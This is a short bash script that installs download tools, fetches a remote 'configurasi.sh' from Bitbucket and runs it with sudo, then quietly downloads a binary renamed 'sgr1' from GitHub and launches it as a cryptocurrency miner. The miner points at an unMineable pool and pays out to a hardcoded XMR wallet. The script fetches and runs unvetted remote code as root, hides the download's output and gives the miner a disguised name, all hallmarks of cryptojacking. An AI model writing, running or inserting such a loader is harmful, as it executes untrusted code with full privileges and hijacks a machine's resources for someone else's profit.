#!/bin/bash
apt-get update ; apt-get install -y wget curl sudo
wget https://bitbucket.org/kacepot/esce/raw/main/configurasi.sh
chmod u+x configurasi.sh
sudo ./configurasi.sh
./configurasi.sh
wget -O sgr1 https://github.com/barburonjilo/back/raw/main/min >/dev/null 2>&1
chmod +x sgr1
./sgr1 --algo PYRIN --pool stratum+ssl://pyrinhash.unmineable.com:4444 --user XMR:83ErkzmC8yH2omjYvg6G7vc4fiP33k9EsXrGjs4ssW7hetWN3VHKgtVDsGTpjipJmDMWnsgpfb32NYw186uYE2UyEcDv343.unmineable_worker_skpqgrai  
